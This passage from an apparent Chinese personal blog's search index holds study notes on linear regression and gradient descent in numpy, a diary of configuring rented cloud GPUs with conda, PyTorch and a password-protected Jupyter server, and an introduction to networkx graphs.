(2.0, 500.0)</span><br></pre></td></tr></table></figure>\n<p>接着绘制数据。我们需要用到<code>matplotlib</code>包中的<code>scatter()</code>函数。</p>\n<p>有点像Matlab里的操作。（喂你在胡言乱语什么，本来就是matplotlib）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-13%20%E4%B8%8B%E5%8D%884.38.43.png\" alt=\"截屏2022-10-13 下午4.38.43\"></p>\n<p>设置初始变量。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">w = <span class=\"number\">100</span></span><br><span class=\"line\">b = <span class=\"number\">100</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-13%20%E4%B8%8B%E5%8D%885.21.59.png\" alt=\"截屏2022-10-13 下午5.21.59\"></p>\n<p>其实就是计算这个<code>f_wb</code>的值，懒得打公式，截个图。</p>\n<p>算法也非常好理解,虽然但是我还是逐行注释了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">compute_model_output</span>(<span class=\"params\">x, w, b</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Computes the prediction of a linear model</span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">      x (ndarray (m,)): Data, m examples </span></span><br><span class=\"line\"><span class=\"string\">      w,b (scalar)    : model parameters  </span></span><br><span class=\"line\"><span class=\"string\">    Returns</span></span><br><span class=\"line\"><span class=\"string\">      y (ndarray (m,)): target values</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    m = x.shape[<span class=\"number\">0</span>]<span class=\"comment\">#获取样本数量</span></span><br><span class=\"line\">    f_wb = np.zeros(m)<span class=\"comment\">#初始化一个m列内容为0的数组。</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        f_wb[i] = w * x[i] + b<span class=\"comment\">#纯纯的计算</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">return</span> f_wb <span class=\"comment\">#返回计算值</span></span><br></pre></td></tr></table></figure>\n<p>然后画出图</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">tmp_f_wb = compute_model_output(x_train, w, b,)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Plot our model prediction</span></span><br><span class=\"line\">plt.plot(x_train, tmp_f_wb, c=<span class=\"string\">&#x27;b&#x27;</span>,label=<span class=\"string\">&#x27;Our Prediction&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Plot the data points</span></span><br><span class=\"line\">plt.scatter(x_train, y_train, marker=<span class=\"string\">&#x27;x&#x27;</span>, c=<span class=\"string\">&#x27;r&#x27;</span>,label=<span class=\"string\">&#x27;Actual Values&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Set the title</span></span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Housing Prices&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the y-axis label</span></span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Price (in 1000s of dollars)&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the x-axis label</span></span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Size (1000 sqft)&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\"></span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-13%20%E4%B8%8B%E5%8D%885.29.13.png\" alt=\"截屏2022-10-13 下午5.29.13\"></p>\n<p>guidance非常贱地给了一句“你看，这个线不符合我们的点。”</p>\n<p>所以challenge就是尝试不同的参数，找到适合的那一条线。</p>\n<p>猴子都知道应该是什么，这个hint也给得很贱。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-10-13%20%E4%B8%8B%E5%8D%885.34.47.png\" alt=\"截屏2022-10-13 下午5.34.47\"></p>\n<p>完整的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\">plt.style.use(<span class=\"string\">&#x27;./deeplearning.mplstyle&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># x_train is the input variable (size in 1000 square feet)</span></span><br><span class=\"line\"><span class=\"comment\"># y_train is the target (price in 1000s of dollars)</span></span><br><span class=\"line\">x_train = np.array([<span class=\"number\">1.0</span>, <span class=\"number\">2.0</span>])</span><br><span class=\"line\">y_train = np.array([<span class=\"number\">300.0</span>, <span class=\"number\">500.0</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;x_train = <span class=\"subst\">&#123;x_train&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;y_train = <span class=\"subst\">&#123;y_train&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">m1 = len(x_train)</span></span><br><span class=\"line\"><span class=\"string\">m2 = x_train.shape[0]</span></span><br><span class=\"line\"><span class=\"string\">print(m1)</span></span><br><span class=\"line\"><span class=\"string\">print(m2)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">\tx_i = x_train[i]</span><br><span class=\"line\">\ty_i = y_train[i]</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;(x^(<span class=\"subst\">&#123;i&#125;</span>), y^(<span class=\"subst\">&#123;i&#125;</span>)) = (<span class=\"subst\">&#123;x_i&#125;</span>, <span class=\"subst\">&#123;y_i&#125;</span>)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Plot the data points</span></span><br><span class=\"line\">plt.scatter(x_train, y_train, marker=<span class=\"string\">&#x27;x&#x27;</span>, c=<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the title</span></span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Housing Prices&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the y-axis label</span></span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Price (in 1000s of dollars)&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the x-axis label</span></span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Size (1000 sqft)&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#plt.show()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">w = <span class=\"number\">200</span></span><br><span class=\"line\">b = <span class=\"number\">100</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">compute_model_output</span>(<span class=\"params\">x, w, b</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Computes the prediction of a linear model</span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">      x (ndarray (m,)): Data, m examples </span></span><br><span class=\"line\"><span class=\"string\">      w,b (scalar)    : model parameters  </span></span><br><span class=\"line\"><span class=\"string\">    Returns</span></span><br><span class=\"line\"><span class=\"string\">      y (ndarray (m,)): target values</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    m = x.shape[<span class=\"number\">0</span>]<span class=\"comment\">#获取样本数量</span></span><br><span class=\"line\">    f_wb = np.zeros(m)<span class=\"comment\">#初始化一个m列内容为0的数组。</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        f_wb[i] = w * x[i] + b<span class=\"comment\">#纯纯的计算</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">return</span> f_wb <span class=\"comment\">#返回计算值</span></span><br><span class=\"line\"></span><br><span class=\"line\">tmp_f_wb = compute_model_output(x_train, w, b,)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Plot our model prediction</span></span><br><span class=\"line\">plt.plot(x_train, tmp_f_wb, c=<span class=\"string\">&#x27;b&#x27;</span>,label=<span class=\"string\">&#x27;Our Prediction&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Plot the data points</span></span><br><span class=\"line\">plt.scatter(x_train, y_train, marker=<span class=\"string\">&#x27;x&#x27;</span>, c=<span class=\"string\">&#x27;r&#x27;</span>,label=<span class=\"string\">&#x27;Actual Values&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Set the title</span></span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Housing Prices&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the y-axis label</span></span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Price (in 1000s of dollars)&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># Set the x-axis label</span></span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Size (1000 sqft)&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\"></span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/截屏2022-10-13 下午5.21.59.png\" alt></p>\n","categories":["ML"],"tags":["CS329P"]},{"title":"菜鸟云GPU方案","url":"/2023/03/24/ml_%E8%8F%9C%E9%B8%9F%E4%BA%91GPU%E6%96%B9%E6%A1%88/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-AbtEyHsW\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"腾讯云\">腾讯云</span></h2><p>随便点了一个四十五块十五天的套餐，不过我知道十五天后不可能是这个价，虽然速度很垃圾但是便宜。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%208.29.19%20PM.png\" alt=\"Screen Shot 2023-03-24 at 8.29.19 PM\"><br>然后安装jupyter以及一些必须的裤。<br>jupyter还是很舒服，但是如果开了梯子就慢成树懒。<br>性能的话d2l里Alexnet跑mnish 也不快，但至少比colab无gpu或者可怜的mbp inter的cpu跑得快。<br>我下午还抱有一丝侥幸心理想说不定我电脑撑得住呢。结果快二十分钟一个epoch都没有跑完，cpu python占用率99.9%。。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%208.32.39%20PM.png\" alt=\"Screen Shot 2023-03-24 at 8.32.39 PM\"></p>\n<p>omg，这个好像移动那种一块钱订阅，12月起订不得取消续费。。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-24%20at%208.35.24%20PM.png\" alt=\"Screen Shot 2023-03-24 at 8.35.24 PM\"></p>\n<p>这个方案基本作废，性价比奇低。</p>\n<h2><span id=\"autodl\">AutoDL</span></h2><p>吃饭的时候刷知乎看看有没有云gpu方案推荐，大家都说这个autodl好，我看了一眼3090全租光了，下次再来看看吧。<br>2023.3.24<br>大致试了一下，一个是3090，一个是A40，其实两者的算力理论上是差不多的，但是d2l给的代码不能直接支持3090运行，这个都是小case。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-25%20at%207.14.08%20PM.png\" alt=\"Screen Shot 2023-03-25 at 7.14.08 PM\"><br>有一点比较恼火，就是d2l不是需要用conda 激活环境吗，然后如果我要用jupyter显示那些图之类的，目前没有找到好的方法在终端直接执行命令去起一个jupyter notebook。因为这个云服务器没有给我公网ip，虽然能查到，但是用那个ip地址没有办法连接到jupyter，所以只能用控制台自带的那个jupyter链接，但是在那个窗口我有没有办法成功用conda激活环境。。<br>而且下载数据集奇慢无比，不过还好可以用本地上传来解决。</p>\n<p>2023.3.25</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -m venv tutorial-env</span><br><span class=\"line\">source tutorial-env/<span class=\"built_in\">bin</span>/activate</span><br></pre></td></tr></table></figure>\n<p>坑比较多，但是还是能解决的。<br>关于jupyter的配置问题，有两个解决思路。</p>\n<h3><span id=\"ipykernel添加conda环境\">ipykernel添加conda环境</span></h3><p>这个比较常规。<br>基本方案是<br>1) 在默认bash中<code>conda init</code><br>2) <code>conda create</code>+<code>conda activate</code>，常规 解法。<br>3) <code>conda install ipykernel</code>，<code>ipython kernel install --user --name=d2l</code><br>4) 然后利用<code>conda install pytorch</code>,<code>pip install d2l</code>等安装库<br>5) 直接点开jupyter lab，选择启动内核为d2l。<br>目前这个方案是可行的，包什么的都能导入，但是就在我准备测试代码的时候，autodl崩了，速度血慢，遂放弃，明天再来。</p>\n<h3><span id=\"暴力开启jupyter服务\">暴力开启jupyter服务</span></h3><p>这个方法是看别人博客上的，基本思路就是按照普通的方式起jupyter服务。本来这应该是基本操作，但是由于autodl并没有那种可以给你起服务的公网ip，并且开启那个所谓的自定义服务以后，给你的端口还是固定的，所以需要修改jupyter默认的端口。<br>以下是原文链接：<br><a href=\"https://blog.csdn.net/Supremelv/article/details/128671144?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-15-128671144-blog-125689759.235%5Ev27%5Epc_relevant_default_base1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-15-128671144-blog-125689759.235%5Ev27%5Epc_relevant_default_base1&amp;utm_relevant_index=22\">https://blog.csdn.net/Supremelv/article/details/128671144?spm=1001.2101.3001.6650.15&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-15-128671144-blog-125689759.235%5Ev27%5Epc_relevant_default_base1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-15-128671144-blog-125689759.235%5Ev27%5Epc_relevant_default_base1&amp;utm_relevant_index=22</a></p>\n<p>另，blog里面有很多没有必要的步骤，见仁见智吧。</p>\n<p>大致步骤<br><code>jupyter-notebook --generate-config</code></p>\n<p><code>jupyter-notebook password</code></p>\n<p><code>vim /root/.jupyter/jupyter_notebook_config.json</code></p>\n<p><code>vim /root/.jupyter/jupyter_notebook_config.py</code></p>\n<p>添加：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">c.NotebookApp.ip=<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#允许通过任意绑定的服务器的ip访问</span></span><br><span class=\"line\">c.NotebookApp.port =6006<span class=\"comment\">#这个端口是docker容器和宿主机的映射端口</span></span><br><span class=\"line\">c.NotebookApp.open_browser=False</span><br><span class=\"line\"><span class=\"comment\">#不自动打开浏览器</span></span><br><span class=\"line\">c.NotebookApp.password=u<span class=\"string\">&#x27;刚才复制的很长的那个密码&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>ok<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure></p>\n<p>尚未测试，原因同1。</p>\n<p>2023.3.26</p>\n<p>成功（</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-26%20at%2011.40.25%20AM.png\" alt=\"Screen Shot 2023-03-26 at 11.40.25 AM\"></p>\n<p>好慢好慢好慢<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-26%20at%2011.43.37%20AM.png\" alt=\"Screen Shot 2023-03-26 at 11.43.37 AM\"></p>\n<p>还是不要试图尝试用这个网络下载数据集。。。<br>但是gpu还是很快，跑一个resnet试一下。<br>2023.3.27<br>大失败，在d2l环境里不知道为什么就没有gpu了，，，<br>明明能够识别出来安装了gpu，但是一跑代码就是training on cpu////<br>重新用3090的机子试了一下并没有出现类似的问题。可能是环境的bug。。</p>\n<h3><span id=\"3090不兼容\">3090不兼容</span></h3><p>这个问题网上一搜一堆解决方案，目前在尝试升级torch版本，能否成功尚未知。<br><a href=\"https://blog.csdn.net/a563562675/article/details/121656894\">https://blog.csdn.net/a563562675/article/details/121656894</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%205.33.00%20PM.png\" alt=\"Screen Shot 2023-03-27 at 5.33.00 PM\"><br>ok，成功。</p>\n<h3><span id=\"vpn配置\">vpn配置</span></h3><p>有机会把梯子规则改一下。。<br>ok，只要添加一下服务器的url就可以了。</p>\n<h3><span id=\"总结\">总结</span></h3><p>一套无坑配置：<br>拿到新的机子（以3090为例），ssh连接或者用平台提供的jupyter lab的终端也可以。</p>\n<ol>\n<li>切到<code>/minicoda/bin</code>文件夹，<code>conda init</code>初始化</li>\n<li>重启终端，按照d2l环境配置：<code>conda create --name d2l python=3.9 -y</code>，接着<code>conda activate d2l</code>。</li>\n<li>然后这里，由于这个用户默认为root，如果嗯装什么包他不会给你报错，但是亲测装了等于没有装，于是再起一个python的虚拟环境，也就是<code>python -m venv tutorial-env</code>，<code>source tutorial-env/bin/activate</code>。</li>\n<li>然后安装torch，这里是坑最多的，3090的话直接<code>pip3 install torch==1.7.1+cu110 torchvision==0.8.2+cu110 -f https://download.pytorch.org/whl/cu110/torch_stable.html</code></li>\n<li>然后<code>pip install d2l</code>。</li>\n<li>这个时候基本上就可以在bash里跑py了，但是非常不优雅。于是下一步是配置jupyter。</li>\n<li>大致步骤<br><code>jupyter-notebook --generate-config</code></li>\n</ol>\n<p><code>jupyter-notebook password</code></p>\n<p><code>vim /root/.jupyter/jupyter_notebook_config.json</code></p>\n<p><code>vim /root/.jupyter/jupyter_notebook_config.py</code></p>\n<p>添加：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">c.NotebookApp.ip=<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#允许通过任意绑定的服务器的ip访问</span></span><br><span class=\"line\">c.NotebookApp.port =6006<span class=\"comment\">#这个端口是docker容器和宿主机的映射端口</span></span><br><span class=\"line\">c.NotebookApp.open_browser=False</span><br><span class=\"line\"><span class=\"comment\">#不自动打开浏览器</span></span><br><span class=\"line\">c.NotebookApp.password=u<span class=\"string\">&#x27;刚才复制的很长的那个密码&#x27;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>ok<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>注意是在激活d2l环境中的打开jupyter。</p>\n<ol>\n<li>到autodi控制台里面点开那个自定义服务，没有什么问题的话就是jupyter，其他使用方法就没有什么坑了。</li>\n</ol>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%205.44.57%20PM.png\" alt=\"Screen Shot 2023-03-27 at 5.44.57 PM\"></p>\n<p>3090的速度还是很不错的。</p>\n<h3><span id=\"ps\">ps</span></h3><p>autodl的ssh登陆会和hexo自动部署到服务器的ssh密钥还是什么发生冲突，最简单粗暴的解决方法是直接吧.ssh文件夹里的konw-host文件删除，但是我看网上还有更优雅的解决方式。昨天看到部署博客报错我的心都凉了半截，还好只是我自己自作孽不是整个gitpage都崩了。</p>\n","categories":["ML"],"tags":["mess"]},{"title":"CS 329P note4","url":"/2022/10/31/ms_CS-329P%20%7C%20note4/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-NUaZqFnE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>     </p>\n<p>​        依然是很久很久没有写笔记了，最近学习计划也在一直搁置。先把没有做完的assignment补完。</p>\n<h2><span id=\"week1-lab5\">week1-lab5</span></h2><p>聚焦于梯度下降。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math, copy</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\">plt.style.use(<span class=\"string\">&#x27;./deeplearning.mplstyle&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">from</span> lab_utils_uni <span class=\"keyword\">import</span> plt_house_x, plt_contour_wgrad, plt_divergence, plt_gradients</span><br></pre></td></tr></table></figure>\n<p>必要库的导入。</p>\n<p>首先画出表格：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Load our data set</span></span><br><span class=\"line\">x_train = np.array([<span class=\"number\">1.0</span>, <span class=\"number\">2.0</span>])   <span class=\"comment\">#features</span></span><br><span class=\"line\">y_train = np.array([<span class=\"number\">300.0</span>, <span class=\"number\">500.0</span>])   <span class=\"comment\">#target value</span></span><br></pre></td></tr></table></figure>\n<p>计算出代价函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Function to calculate the cost</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">compute_cost</span>(<span class=\"params\">x, y, w, b</span>):</span></span><br><span class=\"line\">   </span><br><span class=\"line\">    m = x.shape[<span class=\"number\">0</span>] </span><br><span class=\"line\">    cost = <span class=\"number\">0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        f_wb = w * x[i] + b</span><br><span class=\"line\">        cost = cost + (f_wb - y[i])**<span class=\"number\">2</span></span><br><span class=\"line\">    total_cost = <span class=\"number\">1</span> / (<span class=\"number\">2</span> * m) * cost</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> total_cost</span><br></pre></td></tr></table></figure>\n<p>(这都是前一个lab的内容)</p>\n<p>为了计算梯度下降，首先需要计算变量的梯度函数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">compute_gradient</span>(<span class=\"params\">x, y, w, b</span>):</span> </span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Computes the gradient for linear regression </span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">      x (ndarray (m,)): Data, m examples </span></span><br><span class=\"line\"><span class=\"string\">      y (ndarray (m,)): target values</span></span><br><span class=\"line\"><span class=\"string\">      w,b (scalar)    : model parameters  </span></span><br><span class=\"line\"><span class=\"string\">    Returns</span></span><br><span class=\"line\"><span class=\"string\">      dj_dw (scalar): The gradient of the cost w.r.t. the parameters w</span></span><br><span class=\"line\"><span class=\"string\">      dj_db (scalar): The gradient of the cost w.r.t. the parameter b     </span></span><br><span class=\"line\"><span class=\"string\">     &quot;&quot;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Number of training examples</span></span><br><span class=\"line\">    m = x.shape[<span class=\"number\">0</span>]    </span><br><span class=\"line\">    dj_dw = <span class=\"number\">0</span></span><br><span class=\"line\">    dj_db = <span class=\"number\">0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):  </span><br><span class=\"line\">        f_wb = w * x[i] + b </span><br><span class=\"line\">        dj_dw_i = (f_wb - y[i]) * x[i] </span><br><span class=\"line\">        dj_db_i = f_wb - y[i] </span><br><span class=\"line\">        dj_db += dj_db_i</span><br><span class=\"line\">        dj_dw += dj_dw_i </span><br><span class=\"line\">    dj_dw = dj_dw / m </span><br><span class=\"line\">    dj_db = dj_db / m </span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">return</span> dj_dw, dj_db</span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["CS329P"]},{"title":"Networkx Note","url":"/2023/09/03/network,%20graph,%20and%20Networkx/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h1><span id=\"1-理论\">1 理论</span></h1><p>不考虑代码，仅从抽象概念上理解。</p>\n<h2><span id=\"基础的图论问题\">基础的图论问题</span></h2><p>图论需要解决什么？<br>简单来讲就是提供一堆节点和边，针对不同问题利用算法最好地权衡资源分配来组合这些节点和边。</p>\n<h3><span id=\"minimum-spanning-tree\">minimum spanning tree</span></h3><p>即最小生成树<br>一个图能生成多个树，树可以理解为是一个图的子图。（gpt说的。）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%202.33.39%20AM.png\" alt=\"Screen Shot 2023-09-03 at 2.33.39 AM\"></p>\n<p>但是这个子图必须包含原图的所有node，并且每个node至少得连上，不能有单独存在的没有任何连接的边的node。<br>那么对于一个带权连通图，生成树不同，树中各边上权值总和也不同，权值总和最小的生成树则称为图的最小生成树。<br>对于如何求最小生成树，有两种比较著名的算法，这里先看Prim算法。</p>\n<h5><span id=\"prim算法\">Prim算法</span></h5><p>其实就是从任意节点出发，找边里权重最小的那条边，到达下一个节点继续找权重最小的边，直到把所有节点都访问到，然后存下最短路径。</p>\n<h1><span id=\"2-code\">2 code</span></h1><h2><span id=\"21-图的创建\">2.1 图的创建</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G = nx.Graph() <span class=\"comment\">#新建一个图</span></span><br><span class=\"line\"><span class=\"comment\">#G.add_node(1) #添加一个节点</span></span><br><span class=\"line\">G.add_nodes_from([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">9</span>]) <span class=\"comment\">#创建五个节点，其attr分别为12599</span></span><br><span class=\"line\">G.add_edge(<span class=\"number\">4</span>,<span class=\"number\">5</span>) <span class=\"comment\">#另创建两个节点，attr为4和5，并用一条边连接</span></span><br><span class=\"line\">G.add_edge(<span class=\"number\">4</span>,<span class=\"number\">3</span>) <span class=\"comment\">#创建节点3，并将34相连</span></span><br><span class=\"line\">nx.draw(G)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%201.45.16%20AM.png\" alt=\"Screen Shot 2023-09-03 at 1.45.16 AM\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">G = nx.Graph() </span><br><span class=\"line\"><span class=\"comment\">#G.add_node(1) #添加一个节点</span></span><br><span class=\"line\">G.add_nodes_from([<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>]) <span class=\"comment\">#创建五个节点，其attr分别为12599</span></span><br><span class=\"line\">G.add_edges_from([(<span class=\"number\">1</span>,<span class=\"number\">3</span>),(<span class=\"number\">3</span>,<span class=\"number\">4</span>)])</span><br><span class=\"line\">nx.draw(G)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%201.47.51%20AM.png\" alt=\"Screen Shot 2023-09-03 at 1.47.51 AM\"></p>\n<h2><span id=\"22-节点与边的属性\">2.2 节点与边的属性</span></h2><h4><span 